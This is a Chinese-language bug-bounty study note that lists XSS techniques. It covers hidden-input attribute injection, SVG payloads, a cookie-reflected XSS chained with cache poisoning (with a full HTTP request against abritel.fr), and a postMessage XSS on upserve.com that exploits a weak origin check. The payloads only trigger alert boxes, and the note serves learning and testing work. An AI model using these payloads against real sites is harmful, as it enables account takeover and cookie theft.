1.隐藏输入中的xss（绕过输入转义）
参数，位于post请求中的listViewHeading=
有效负载：" accesskey=X onclick=alert()
![[Pasted image 20241014211401.png]]
" accesskey=X onclick=alert() xxx
![[Pasted image 20241014211445.png]]
success

2.个人主页的项目名称中可以插入xsspayload
```
post
name="><svg onload="prompt(/xss/);"><!--
```

3.二维码xss
二维码执行js

4.cookie里的xss
cookie: hav=xxx 反射到页面上
payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
缓存投毒，http响应里的头Cache-Control和Expires表明可以缓存
还发现cookie明文存储在页面js的这个变量window.INITIAL_STATE.system.cookie
直接alert(window.INITIAL_STATE.system.cookie)
厂商通过去除hav反射在页面修复该问题
邦邦的https://hackerone.com/reports/1760213

```
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```
.js触发缓存。?xxxd缓存破坏器

5.postmessage相关的xss
网页存在代码![[Pasted image 20241017232723.png|700]]
e.data有exec的话就用eval执行代码，这里检查origin，但是不严格
```
可以构造https://hq.upserve.com.mydomain.com/xss.html
页面里window.opener.postMessage({exec:'alert("xss")'},"https://inventory.upserve.com/login/);
向目标网站发送一个包含代码执行的消息
```
推荐插件:postmessage tracker
自动化工具：semgrep
或者自己在开发者工具搜
![[Pasted image 20241017233752.png]]
